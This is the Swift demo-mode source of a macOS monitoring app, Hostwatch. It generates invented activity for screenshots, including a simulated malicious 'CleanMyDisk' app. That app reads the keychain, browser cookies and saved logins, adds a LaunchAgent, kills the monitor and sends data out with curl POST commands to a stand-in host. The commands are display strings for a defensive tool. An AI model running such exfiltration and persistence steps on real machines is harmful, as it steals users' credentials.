// Demo mode exists only in the demo build: DEMO=1 ./scripts/build-app.sh (Swift flag -DDEMO).
#if DEMO
import Foundation

/// `Hostwatch --demo <folder> [scene]`: the app filled with made-up activity of a made-up user, for screenshots.
/// Everything it keeps goes to <folder>; it never connects to the collector. It refuses to run under the real
/// app's bundle id, so it can't touch the real settings either (run it from a copy with another id).
enum Demo {
    nonisolated(unsafe) static var root: URL?
    nonisolated(unsafe) static var scene = "events"
    static var active: Bool { root != nil }
    /// "Now" for the whole demo, so launches and the running list agree on start times.
    static let epoch = Date()
    static let flag = "--demo"
    static let home = "/Users/alex"
    static let scenes = ["hud", "events", "live", "running", "patterns", "stories", "network", "firewall", "watch"]

    static func configure(_ args: [String]) {
        guard let i = args.firstIndex(of: flag) else { return }
        guard i + 1 < args.count else { print("Usage: Hostwatch \(flag) <folder> [\(scenes.joined(separator: "|"))]"); exit(1) }
        let id = Bundle.main.bundleIdentifier ?? ""
        guard !id.isEmpty, id != AppPaths.bundleID else {
            print("Demo mode needs a copy of the app with its own bundle id (this one is \(id.isEmpty ? "none" : id)), "
                  + "so the real settings stay untouched.")
            exit(1)
        }
        let dir = URL(fileURLWithPath: args[i + 1], isDirectory: true)
        try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        root = dir
        if i + 2 < args.count, scenes.contains(args[i + 2]) { scene = args[i + 2] }
        setenv("HOSTWATCH_SIGNING_DB", dir.appendingPathComponent("signing.json").path, 1)
    }

    // MARK: The made-up Mac

    struct Proc {
        let pid: Int, ppid: Int
        let path: String
        let args: String
        let ago: TimeInterval          // started this long ago
        let user: String
        let cpu: Double
        let mem: Int64
        let threads: Int
        var name: String { (path as NSString).lastPathComponent }
    }

    static let safari = "/Applications/Safari.app/Contents/MacOS/Safari"
    static let mail = "/System/Applications/Mail.app/Contents/MacOS/Mail"
    static let music = "/System/Applications/Music.app/Contents/MacOS/Music"
    static let terminal = "/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal"
    static let finder = "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"
    static let cleaner = home + "/Downloads/CleanMyDisk.app/Contents/MacOS/CleanMyDisk"
    static let launchd = "/sbin/launchd"

    static let processes: [Proc] = [
        Proc(pid: 0, ppid: 0, path: "kernel_task", args: "", ago: 4 * 86_400, user: "root", cpu: 6.4, mem: 1_100_000_000, threads: 612),
        Proc(pid: 1, ppid: 0, path: launchd, args: "/sbin/launchd", ago: 4 * 86_400, user: "root", cpu: 0.3, mem: 38_000_000, threads: 5),
        Proc(pid: 312, ppid: 1, path: "/System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer",
             args: "WindowServer -daemon", ago: 4 * 86_400, user: "_windowserver", cpu: 11.2, mem: 610_000_000, threads: 21),
        Proc(pid: 401, ppid: 1, path: "/System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Support/mds_stores",
             args: "mds_stores", ago: 4 * 86_400, user: "root", cpu: 2.1, mem: 140_000_000, threads: 9),
        Proc(pid: 655, ppid: 1, path: finder, args: finder, ago: 4 * 86_400 - 60, user: "alex", cpu: 0.4, mem: 182_000_000, threads: 11),
        Proc(pid: 660, ppid: 1, path: "/System/Library/CoreServices/Dock.app/Contents/MacOS/Dock", args: "Dock",
             ago: 4 * 86_400 - 60, user: "alex", cpu: 0.2, mem: 96_000_000, threads: 6),
        Proc(pid: 702, ppid: 1, path: "/System/Library/CoreServices/ControlCenter.app/Contents/MacOS/ControlCenter",
             args: "ControlCenter", ago: 4 * 86_400 - 55, user: "alex", cpu: 0.6, mem: 71_000_000, threads: 8),
        Proc(pid: 2210, ppid: 1, path: mail, args: mail, ago: 3 * 3600, user: "alex", cpu: 0.8, mem: 412_000_000, threads: 14),
        Proc(pid: 2380, ppid: 1, path: music, args: music, ago: 2 * 3600 + 600, user: "alex", cpu: 3.9, mem: 268_000_000, threads: 23),
        Proc(pid: 3101, ppid: 1, path: safari, args: safari, ago: 50 * 60, user: "alex", cpu: 8.7, mem: 1_480_000_000, threads: 34),
        Proc(pid: 3120, ppid: 1, path: "/System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent",
             args: "com.apple.WebKit.WebContent", ago: 49 * 60, user: "alex", cpu: 14.2, mem: 920_000_000, threads: 18),
        Proc(pid: 3301, ppid: 1, path: terminal, args: terminal, ago: 40 * 60, user: "alex", cpu: 1.1, mem: 120_000_000, threads: 9),
        Proc(pid: 3305, ppid: 3301, path: "/usr/bin/login", args: "login -pf alex", ago: 40 * 60, user: "root", cpu: 0, mem: 3_000_000, threads: 2),
        Proc(pid: 3306, ppid: 3305, path: "/bin/zsh", args: "-zsh", ago: 40 * 60, user: "alex", cpu: 0, mem: 4_500_000, threads: 1),
        Proc(pid: 3420, ppid: 3306, path: "/usr/bin/python3", args: "python3 -m http.server 8000", ago: 31 * 60, user: "alex",
             cpu: 0.1, mem: 28_000_000, threads: 3),
        Proc(pid: 4012, ppid: 1, path: cleaner, args: "CleanMyDisk --background", ago: 12 * 60, user: "alex", cpu: 97.4, mem: 845_000_000, threads: 16),
        Proc(pid: 4050, ppid: 4012, path: "/bin/sh", args: "sh -c while true; do curl -s -X POST -d @- https://update.cleanmydisk-cdn.xyz/v2/ping; sleep 60; done",
             ago: 11 * 60, user: "alex", cpu: 0.1, mem: 2_200_000, threads: 1),
        Proc(pid: 5120, ppid: 1, path: "/Applications/Hostwatch.app/Contents/MacOS/Hostwatch", args: "Hostwatch", ago: 4 * 86_400 - 50,
             user: "alex", cpu: 1.6, mem: 210_000_000, threads: 12),
        Proc(pid: 5131, ppid: 1, path: "/Applications/Hostwatch.app/Contents/MacOS/Hostwatch",
             args: "Hostwatch --collector --owner-pid 5120", ago: 4 * 86_400 - 48, user: "root", cpu: 2.3, mem: 64_000_000, threads: 15),
        Proc(pid: 811, ppid: 1, path: "/usr/libexec/trustd", args: "trustd", ago: 4 * 86_400, user: "root", cpu: 0, mem: 19_000_000, threads: 4),
        Proc(pid: 820, ppid: 1, path: "/usr/sbin/bluetoothd", args: "bluetoothd", ago: 4 * 86_400, user: "root", cpu: 0.2, mem: 15_000_000, threads: 7),
        Proc(pid: 870, ppid: 1, path: "/usr/libexec/nsurlsessiond", args: "nsurlsessiond", ago: 4 * 86_400 - 40, user: "alex", cpu: 0.1,
             mem: 12_000_000, threads: 4),
        Proc(pid: 905, ppid: 1, path: "/System/Library/PrivateFrameworks/CloudKitDaemon.framework/Support/cloudd", args: "cloudd",
             ago: 4 * 86_400 - 40, user: "alex", cpu: 0.3, mem: 34_000_000, threads: 6),
        Proc(pid: 912, ppid: 1, path: "/usr/libexec/sharingd", args: "sharingd", ago: 4 * 86_400 - 40, user: "alex", cpu: 0, mem: 22_000_000, threads: 5),
        Proc(pid: 940, ppid: 1, path: "/System/Library/CoreServices/Spotlight.app/Contents/MacOS/Spotlight", args: "Spotlight",
             ago: 4 * 86_400 - 40, user: "alex", cpu: 0.1, mem: 58_000_000, threads: 7),
    ]

    static func runningList(now: Date = epoch, jitter: Bool = true) -> [RunningProcessInfo] {
        processes.map { p in
            let wobble = jitter ? Double.random(in: 0.9...1.03) : 1
            let start = (now.timeIntervalSince1970 - p.ago).rounded()
            return RunningProcessInfo(pid: p.pid, ppid: p.ppid, start: start, uid: p.user == "root" ? 0 : 501, user: p.user,
                                      name: p.name, path: p.path.hasPrefix("/") ? p.path : "", args: p.args,
                                      cpu: (p.cpu * wobble * 10).rounded() / 10, cpuTime: (p.ago * p.cpu / 100 * 100).rounded() / 100,
                                      mem: p.mem, threads: p.threads)
        }
    }

    // MARK: Activity (collector JSON lines, oldest first)

    /// The lines the collector would have sent over the last ~45 minutes.
    static func lines(now: Date = epoch) -> [Data] {
        var out: [(Date, [String: Any])] = []
        func t(_ ago: TimeInterval) -> Date { now.addingTimeInterval(-ago) }
        func exec(_ p: Proc, parent: String, at ago: TimeInterval? = nil) {
            out.append((t(ago ?? p.ago), ["kind": "exec", "pid": p.pid, "ppid": p.ppid, "name": p.name, "proc": p.path,
                                          "target": p.path, "extra": "", "parent": parent, "args": p.args,
                                          "pstart": (now.timeIntervalSince1970 - p.ago).rounded()]))
        }
        func net(_ path: String, _ pid: Int, _ target: String, host: String = "", proto: String = "TCP", at ago: TimeInterval) {
            out.append((t(ago), ["kind": "net", "pid": pid, "ppid": 1, "name": (path as NSString).lastPathComponent, "proc": path,
                                 "target": target, "extra": proto, "parent": "", "host": host, "host_src": host.isEmpty ? "" : "dns"]))
        }
        func file(_ path: String, _ pid: Int, _ mode: String, _ target: String, at ago: TimeInterval) {
            out.append((t(ago), ["kind": "file", "pid": pid, "ppid": 1, "name": (path as NSString).lastPathComponent, "proc": path,
                                 "target": target, "extra": mode, "parent": ""]))
        }
        let byPid = Dictionary(uniqueKeysWithValues: processes.map { ($0.pid, $0) })

        // Everyday work.
        exec(byPid[2210]!, parent: launchd)
        net(mail, 2210, "17.42.251.41:993", host: "p71-imap.mail.me.com", at: 2 * 3600)
        exec(byPid[2380]!, parent: launchd)
        net(music, 2380, "17.253.83.201:443", host: "api.music.apple.com", at: 2 * 3600)
        exec(byPid[3101]!, parent: launchd)
        let sites = [("www.apple.com", "17.253.144.10"), ("developer.apple.com", "17.253.83.143"), ("github.com", "140.82.121.4"),
                     ("news.ycombinator.com", "209.216.230.207"), ("en.wikipedia.org", "185.15.59.224"),
                     ("docs.swift.org", "151.101.1.91"), ("www.theverge.com", "151.101.65.52"), ("fonts.gstatic.com", "142.250.74.3")]
        for (i, site) in sites.enumerated() {
            net(safari, 3101, site.1 + ":443", host: site.0, at: 48 * 60 - Double(i) * 70)
        }
        exec(byPid[3301]!, parent: launchd)
        exec(byPid[3305]!, parent: terminal)
        exec(byPid[3306]!, parent: "/usr/bin/login")
        let git = Proc(pid: 3350, ppid: 3306, path: "/usr/bin/git", args: "git pull --rebase", ago: 38 * 60, user: "alex", cpu: 0, mem: 0, threads: 1)
        exec(git, parent: "/bin/zsh")
        net("/usr/bin/git", 3350, "140.82.121.4:443", host: "github.com", at: 38 * 60 - 1)
        file("/usr/bin/git", 3350, "w", home + "/Projects/site/.git/FETCH_HEAD", at: 38 * 60 - 2)
        let ssh = Proc(pid: 3380, ppid: 3306, path: "/usr/bin/ssh", args: "ssh deploy@build.example.org", ago: 35 * 60, user: "alex",
                       cpu: 0, mem: 0, threads: 1)
        exec(ssh, parent: "/bin/zsh")
        net("/usr/bin/ssh", 3380, "203.0.113.25:22", host: "build.example.org", at: 35 * 60 - 1)
        file("/usr/bin/ssh", 3380, "r", home + "/.ssh/id_ed25519", at: 35 * 60 - 1)
        exec(byPid[3420]!, parent: "/bin/zsh")
        file("/usr/bin/python3", 3420, "r", home + "/Projects/site/index.html", at: 30 * 60)
        let curl = Proc(pid: 3460, ppid: 3306, path: "/usr/bin/curl", args: "curl -s https://wttr.in/Kyiv", ago: 25 * 60, user: "alex",
                        cpu: 0, mem: 0, threads: 1)
        exec(curl, parent: "/bin/zsh")
        net("/usr/bin/curl", 3460, "5.9.243.187:443", host: "wttr.in", at: 25 * 60 - 1)

        // The bad download: Safari → quarantine removed → the app runs → autostart → it calls home.
        file(safari, 3101, "w", home + "/Downloads/CleanMyDisk.dmg", at: 15 * 60)
        net(safari, 3101, "104.21.48.111:443", host: "cleanmydisk-pro.app", at: 15 * 60 + 5)
        let xattr = Proc(pid: 3990, ppid: 3306, path: "/usr/bin/xattr", args: "xattr -d com.apple.quarantine " + home + "/Downloads/CleanMyDisk.app",
                         ago: 13 * 60, user: "alex", cpu: 0, mem: 0, threads: 1)
        exec(xattr, parent: "/bin/zsh")
        exec(byPid[4012]!, parent: launchd)
        file(cleaner, 4012, "r", home + "/Library/Keychains/login.keychain-db", at: 12 * 60 - 3)
        file(cleaner, 4012, "r", home + "/Library/Safari/Cookies.binarycookies", at: 12 * 60 - 4)
        file(cleaner, 4012, "w", home + "/Library/LaunchAgents/com.cleanmydisk.update.plist", at: 12 * 60 - 6)
        net(cleaner, 4012, "45.33.12.7:8443", host: "update.cleanmydisk-cdn.xyz", at: 12 * 60 - 8)
        exec(byPid[4050]!, parent: cleaner)
        net(cleaner, 4012, "91.215.85.17:4444", at: 10 * 60)
        for k in 0..<6 {
            net("/usr/bin/curl", 4060 + k, "45.33.12.7:443", host: "update.cleanmydisk-cdn.xyz", at: 9 * 60 - Double(k) * 60)
        }

        // A few more, recent.
        net(safari, 3101, "140.82.121.4:443", host: "github.com", at: 4 * 60)
        net(music, 2380, "17.253.83.201:443", host: "api.music.apple.com", at: 3 * 60)
        net("/usr/libexec/nsurlsessiond", 870, "17.248.211.70:443", host: "gateway.icloud.com", at: 2 * 60)
        net(mail, 2210, "17.42.251.41:993", host: "p71-imap.mail.me.com", at: 90)
        let open = Proc(pid: 4200, ppid: 3306, path: "/usr/bin/open", args: "open -a Safari https://hostwatch.local/docs", ago: 40,
                        user: "alex", cpu: 0, mem: 0, threads: 1)
        exec(open, parent: "/bin/zsh")
        net("/usr/bin/python3", 3420, "127.0.0.1:8000", at: 20)

        let f = DateFormatter()
        f.dateFormat = "HH:mm:ss"
        return out.sorted { $0.0 < $1.0 }.compactMap { date, obj in
            var o = obj
            o["time"] = f.string(from: date)
            return (try? JSONSerialization.data(withJSONObject: o)).map { $0 + Data("\n".utf8) }
        }
    }

    // MARK: Live (for the website's video)

    /// One more made-up event, as if it just happened: everyday activity, with now and then a step of the bad app.
    static func liveLine(_ i: Int, now: Date = Date()) -> Data {
        let f = DateFormatter()
        f.dateFormat = "HH:mm:ss"
        let templates: [[String: Any]] = [
            ["kind": "net", "pid": 3101, "name": "Safari", "proc": safari, "target": "140.82.121.4:443", "extra": "TCP", "host": "github.com"],
            ["kind": "net", "pid": 2380, "name": "Music", "proc": music, "target": "17.253.83.201:443", "extra": "TCP", "host": "api.music.apple.com"],
            ["kind": "file", "pid": 3420, "name": "python3", "proc": "/usr/bin/python3", "target": home + "/Projects/site/index.html", "extra": "r"],
            ["kind": "net", "pid": 2210, "name": "Mail", "proc": mail, "target": "17.42.251.41:993", "extra": "TCP", "host": "p71-imap.mail.me.com"],
            ["kind": "exec", "pid": 5000, "name": "git", "proc": "/usr/bin/git", "target": "/usr/bin/git", "args": "git status", "parent": "/bin/zsh"],
            ["kind": "net", "pid": 4060, "name": "curl", "proc": "/usr/bin/curl", "target": "45.33.12.7:443", "extra": "TCP", "host": "update.cleanmydisk-cdn.xyz"],
            ["kind": "net", "pid": 870, "name": "nsurlsessiond", "proc": "/usr/libexec/nsurlsessiond", "target": "17.248.211.70:443", "extra": "TCP", "host": "gateway.icloud.com"],
            ["kind": "file", "pid": 4012, "name": "CleanMyDisk", "proc": cleaner, "target": home + "/Library/Safari/Cookies.binarycookies", "extra": "r"],
            ["kind": "net", "pid": 3101, "name": "Safari", "proc": safari, "target": "151.101.1.91:443", "extra": "TCP", "host": "docs.swift.org"],
            ["kind": "exec", "pid": 5000, "name": "ls", "proc": "/bin/ls", "target": "/bin/ls", "args": "ls -la", "parent": "/bin/zsh"],
        ]
        var o = templates[i % templates.count]
        if (o["kind"] as? String) == "exec" { o["pid"] = 5000 + i; o["ppid"] = 3306 } else { o["ppid"] = 1 }
        if o["parent"] == nil { o["parent"] = "" }
        o["time"] = f.string(from: now)
        return ((try? JSONSerialization.data(withJSONObject: o)) ?? Data()) + Data("\n".utf8)
    }

    // MARK: Watch Closely

    /// What Watch Closely would have recorded of CleanMyDisk for a minute.
    static func watchProfile() -> BehaviorProfile {
        func proc(_ pid: Int, _ path: String, ppid: Int = 1) -> [String: Any] {
            ["audit_token": ["pid": pid], "ppid": ppid, "executable": ["path": path]]
        }
        func file(_ path: String) -> [String: Any] { ["path": path, "path_truncated": false] }
        func ev(_ pid: Int, _ path: String, _ type: String, _ body: [String: Any]) -> [String: Any] {
            ["process": proc(pid, path), "event": [type: body], "event_type": 0]
        }
        let r = BehaviorRecorder(pid: 4012, name: "CleanMyDisk", path: cleaner, args: cleaner, ppid: 1, limit: 60, home: home)
        let me = cleaner
        for lib in ["/usr/lib/libSystem.B.dylib", "/System/Library/Frameworks/Security.framework/Security",
                    "/usr/share/icu/icudt76l.dat", "/private/var/db/timezone/zoneinfo/Europe/Kyiv"] {
            r.add(ev(4012, me, "open", ["fflag": 1, "file": file(lib)]))
        }
        r.add(ev(4012, me, "open", ["fflag": 1, "file": file(home + "/Library/Keychains/login.keychain-db")]))
        r.add(ev(4012, me, "open", ["fflag": 1, "file": file(home + "/Library/Safari/Cookies.binarycookies")]))
        r.add(ev(4012, me, "open", ["fflag": 1, "file": file(home + "/Library/Application Support/Google/Chrome/Default/Login Data")]))
        r.add(ev(4012, me, "create", ["destination_type": 1,
                                      "destination": ["new_path": ["dir": file(home + "/Library/LaunchAgents"),
                                                                   "filename": "com.cleanmydisk.update.plist"]]]))
        r.add(ev(4012, me, "write", ["target": file(home + "/Library/LaunchAgents/com.cleanmydisk.update.plist")]))
        r.add(ev(4012, me, "btm_launch_item_add",
                 ["item": ["item_url": "file://" + home + "/Library/LaunchAgents/com.cleanmydisk.update.plist"]]))
        r.add(ev(4012, me, "create", ["destination_type": 1,
                                      "destination": ["new_path": ["dir": file("/private/tmp"), "filename": ".cmd_helper"]]]))
        r.add(ev(4012, me, "setmode", ["mode": 0o755, "target": file("/private/tmp/.cmd_helper")]))
        r.add(ev(4012, me, "deleteextattr", ["extattr": "com.apple.quarantine", "target": file("/private/tmp/.cmd_helper")]))
        r.add(ev(4012, me, "fork", ["child": proc(4070, me, ppid: 4012)]))
        r.add(ev(4070, me, "exec", ["target": proc(4070, "/bin/sh", ppid: 4012),
                                    "args": ["sh", "-c", "curl -s -X POST --data-binary @/tmp/.c https://update.cleanmydisk-cdn.xyz/v2/u"]]))
        r.add(ev(4070, "/bin/sh", "fork", ["child": proc(4071, "/bin/sh", ppid: 4070)]))
        r.add(ev(4071, "/bin/sh", "exec", ["target": proc(4071, "/usr/bin/curl", ppid: 4070),
                                           "args": ["curl", "-s", "-X", "POST", "--data-binary", "@/tmp/.c",
                                                    "https://update.cleanmydisk-cdn.xyz/v2/u"]]))
        r.add(ev(4012, me, "tcc_modify", ["service": "kTCCServiceScreenCapture", "identity": "com.cleanmydisk.helper"]))
        r.add(ev(4012, me, "xpc_connect", ["service_name": "com.apple.securityd"]))
        r.add(ev(4012, me, "xpc_connect", ["service_name": "com.apple.pasteboard.1"]))
        r.add(ev(4012, me, "mprotect", ["protection": 7]))
        r.add(ev(4012, me, "signal", ["sig": 9, "target": proc(5120, "/Applications/Hostwatch.app/Contents/MacOS/Hostwatch")]))
        r.addConnection(pid: 4071, proto: "TCP", remote: "45.33.12.7:443", host: "update.cleanmydisk-cdn.xyz")
        r.addConnection(pid: 4012, proto: "TCP", remote: "91.215.85.17:4444", host: "")
        r.addConnection(pid: 4012, proto: "UDP", remote: "1.1.1.1:53", host: "one.one.one.one")
        r.tick(seconds: 60)
        r.finish("time limit")
        return r.profile
    }
}
#endif
